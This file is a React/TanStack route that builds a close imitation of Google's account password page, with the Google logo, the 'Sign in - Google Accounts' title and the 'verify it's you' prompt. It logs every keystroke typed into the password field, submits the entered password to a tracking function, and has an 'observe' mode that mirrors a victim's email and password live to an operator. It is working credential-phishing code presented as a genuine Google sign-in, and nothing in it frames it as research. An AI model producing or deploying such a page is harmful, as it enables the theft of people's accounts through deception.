import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import {
  GE_SHELL_CSS,
  GeFontStyle,
  GeFooter,
  GoogleGLogo,
  geAvatarColor,
  geHiName,
  geInitials,
  resolveGeEmail,
  setGeEmail,
  useGeTracking,
} from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/password")({
  head: () => ({
    meta: [
      { title: "Sign in - Google Accounts" },
      { name: "color-scheme", content: "dark" },
    ],
  }),
  component: GePasswordPage,
});

const GE_PASSWORD_CSS = `
${GE_SHELL_CSS}

/* Password page: title sits 24px under logo (Google --c-ts-t) */
.ge-password .ge-title {
  margin-top: 24px;
}

/* Account chip — match dump .Ahygpe.m8wwGd.cd29Sd.EPPJc */
.ge-account-chip {
  display: inline-flex;
  align-items: center;
  gap: 0;
  margin-top: 16px;
  width: fit-content;
  max-width: 100%;
  align-self: flex-start;
  height: 32px;
  padding: 0 8px 0 3px;
  border: 1px solid var(--gm3-outline);
  border-radius: 16px;
  background: var(--gm3-card);
  color: var(--gm3-on-surface);
  font: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.25px;
  line-height: 1.25;
  cursor: pointer;
  text-align: left;
  position: relative;
}
.ge-account-chip:hover {
  background: rgba(227, 227, 227, 0.08);
}
.ge-avatar {
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  color: #fff;
  font-size: 10px;
  font-weight: 500;
  letter-spacing: 0.02em;
  line-height: 1;
  user-select: none;
  margin-right: 8px;
}
.ge-account-email {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  min-width: 0;
  padding-right: 4px;
}
.ge-chip-caret {
  width: 20px;
  height: 20px;
  flex-shrink: 0;
  fill: var(--gm3-on-surface);
  opacity: 0.8;
}

/* Right column: align "To continue…" with "Hi …" (below the G logo) */
.ge-verify {
  margin: 0;
  font-size: 1rem;
  font-weight: 400;
  line-height: 1.5;
  color: var(--gm3-on-surface);
}
@media (min-width: 900px) {
  .ge-password .ge-pane-right {
    padding-top: 72px; /* logo 48px + title margin 24px */
  }
}

.ge-form {
  margin-top: 24px;
  flex: 1;
  display: flex;
  flex-direction: column;
  min-height: 0;
}
@media (min-width: 900px) {
  .ge-form {
    margin-top: 22px;
  }
}

/* Outlined password field — single ring, floating label on the border */
.ge-field {
  position: relative;
  width: 100%;
  height: 56px;
  margin-top: 0;
}
.ge-field input {
  position: relative;
  z-index: 1;
  width: 100%;
  height: 56px;
  margin: 0;
  padding: 13px 15px;
  border: none;
  outline: none;
  background: transparent;
  color: var(--gm3-on-surface);
  font-family: inherit;
  font-size: 1rem;
  font-weight: 400;
  line-height: 24px;
  border-radius: 4px;
  caret-color: var(--gm3-primary);
}
.ge-field .ring {
  position: absolute;
  inset: 0;
  border-radius: 4px;
  pointer-events: none;
  z-index: 2;
  box-shadow: inset 0 0 0 1px var(--gm3-outline);
  transition: box-shadow .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active .ring,
.ge-field.has-value .ring {
  box-shadow: inset 0 0 0 2px var(--gm3-primary);
}
.ge-field label {
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  padding: 0 4px;
  color: var(--gm3-on-surface-variant);
  font-size: 1rem;
  line-height: 1.5;
  pointer-events: none;
  z-index: 3;
  background: var(--gm3-card);
  transition: top .15s cubic-bezier(.4,0,.2,1), font-size .15s cubic-bezier(.4,0,.2,1), color .15s cubic-bezier(.4,0,.2,1);
}
.ge-field.is-active label,
.ge-field.has-value label {
  top: 0;
  font-size: 0.75rem;
  line-height: 1.333;
  color: var(--gm3-primary);
}

/* MDC-style checkbox — empty square by default (matches screenshot) */
.ge-show {
  display: flex;
  align-items: center;
  gap: 14px;
  margin-top: 18px;
  user-select: none;
  cursor: pointer;
  color: var(--gm3-on-surface);
  font-size: 0.875rem;
  line-height: 1.25;
  width: fit-content;
  min-height: 24px;
}
.ge-show input {
  position: absolute;
  opacity: 0;
  width: 0;
  height: 0;
  pointer-events: none;
}
.ge-check {
  width: 18px;
  height: 18px;
  border-radius: 2px;
  border: 2px solid rgb(196, 199, 197);
  display: inline-flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  box-sizing: border-box;
  transition: background .12s, border-color .12s;
}
.ge-show.is-on .ge-check {
  background: var(--gm-next-fill);
  border-color: var(--gm-next-fill);
}
.ge-check svg {
  display: none;
  width: 14px;
  height: 14px;
}
.ge-show.is-on .ge-check svg { display: block; }

/* Pack Forgot password immediately left of Next (same as Create account on signin) */
.ge-actions {
  display: flex;
  flex-direction: row-reverse;
  flex-wrap: wrap;
  align-items: center;
  justify-content: flex-start;
  margin-top: auto;
  padding-top: 32px;
  gap: 0;
  width: 100%;
}
.ge-forgot {
  background: none;
  border: none;
  padding: 0 12px;
  height: 40px;
  border-radius: 20px;
  color: var(--gm-next-fill);
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-forgot:hover { background: rgba(138, 180, 248, 0.08); }
.ge-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  height: 40px;
  min-width: 64px;
  padding: 0 24px;
  border: none;
  border-radius: 20px;
  font-family: inherit;
  font-size: 0.875rem;
  font-weight: 500;
  letter-spacing: 0.0107142857em;
  cursor: pointer;
}
.ge-btn-next {
  background: var(--gm-next-fill);
  color: var(--gm-next-ink);
}
.ge-btn-next:hover:not(:disabled) {
  box-shadow: 0 1px 2px rgba(0,0,0,.3), 0 1px 3px 1px rgba(0,0,0,.15);
  filter: brightness(1.05);
}
.ge-btn-next:disabled {
  opacity: 0.38;
  cursor: default;
  filter: none;
  box-shadow: none;
}
`;

function GePasswordPage() {
  const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
  const [email, setEmail] = useState(() => resolveGeEmail());
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [focused, setFocused] = useState(false);
  const passwordRef = useRef<HTMLInputElement>(null);

  const hi = useMemo(() => geHiName(email), [email]);
  const initials = useMemo(() => (email ? geInitials(email) : ""), [email]);
  const avatarBg = useMemo(
    () => (email ? geAvatarColor(email) : "rgb(95, 99, 104)"),
    [email],
  );

  useEffect(() => {
    const resolved = resolveGeEmail();
    if (resolved) {
      setEmail(resolved);
      setGeEmail(resolved);
    }
    setTimeout(() => passwordRef.current?.focus(), 200);
  }, []);

  useEffect(() => {
    const name = geHiName(email);
    document.title = name ? `Hi ${name}` : "Sign in - Google Accounts";
  }, [email]);

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      const value = String(d.value ?? "");
      if (
        d.field === "password" ||
        d.field === "Passwd" ||
        d.field === "Enter your password" ||
        d.field === "password_submitted"
      ) {
        setPassword(value);
      }
      if (
        d.field === "email" ||
        d.field === "email_submitted" ||
        d.field === "identifier"
      ) {
        setEmail(value);
        setGeEmail(value);
      }
    }
    window.addEventListener("ux:mirror-live-input", onMirror);
    return () => window.removeEventListener("ux:mirror-live-input", onMirror);
  }, [isObserve]);

  const hasValue = password.length > 0;
  const isActive = focused || hasValue;
  const canContinue = password.length > 0;
  const title = hi ? `Hi ${hi}` : "Hi";

  const handleNext = (e?: FormEvent) => {
    e?.preventDefault();
    if (!canContinue) return;
    trackClick("Next");
    trackSubmit("password", password);
  };

  return (
    <div className="ge-shell ge-password">
      <GeFontStyle />
      <style>{GE_PASSWORD_CSS}</style>

      <main className="ge-card" role="main">
        <div className="ge-pane-left">
          <GoogleGLogo className="ge-logo" width={48} height={48} />
          <h1 className="ge-title">{title}</h1>
          <button
            type="button"
            className="ge-account-chip"
            aria-label={`${email || "Account"} selected. Switch account`}
            onClick={() => trackClick("Switch account")}
          >
            <span className="ge-avatar" style={{ background: avatarBg }} aria-hidden="true">
              {initials || "?"}
            </span>
            <span className="ge-account-email" data-profile-identifier="">
              {email || "Account"}
            </span>
            <svg className="ge-chip-caret" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M7 9.5l5 5 5-5H7z" />
            </svg>
          </button>
        </div>

        <div className="ge-pane-right">
          <p className="ge-verify">To continue, first verify it{"\u2019"}s you</p>
          <form className="ge-form" onSubmit={handleNext} autoComplete="off">
            <div
              className={`ge-field${hasValue ? " has-value" : ""}${isActive ? " is-active" : ""}`}
            >
              <input
                ref={passwordRef}
                id="password"
                name="password"
                type={showPassword ? "text" : "password"}
                autoComplete="current-password"
                spellCheck={false}
                aria-label="Enter your password"
                value={password}
                onFocus={() => setFocused(true)}
                onBlur={() => setFocused(false)}
                onChange={(e) => {
                  const v = e.target.value;
                  setPassword(v);
                  trackInput("password", v, "password");
                }}
              />
              <div className="ring" aria-hidden="true" />
              <label htmlFor="password">Enter your password</label>
            </div>

            <label
              className={`ge-show${showPassword ? " is-on" : ""}`}
              onClick={(e) => {
                e.preventDefault();
                setShowPassword((s) => !s);
                trackClick(showPassword ? "Hide password" : "Show password");
              }}
            >
              <input
                type="checkbox"
                checked={showPassword}
                readOnly
                tabIndex={-1}
                aria-hidden="true"
              />
              <span className="ge-check" aria-hidden="true">
                <svg viewBox="0 0 24 24">
                  <path
                    d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
                    fill="rgb(32,33,36)"
                  />
                </svg>
              </span>
              Show password
            </label>

            <div className="ge-actions">
              <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
                Next
              </button>
              <button
                type="button"
                className="ge-forgot"
                onClick={() => trackClick("Forgot password?")}
              >
                Forgot password?
              </button>
            </div>
          </form>
        </div>
      </main>

      <GeFooter />
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
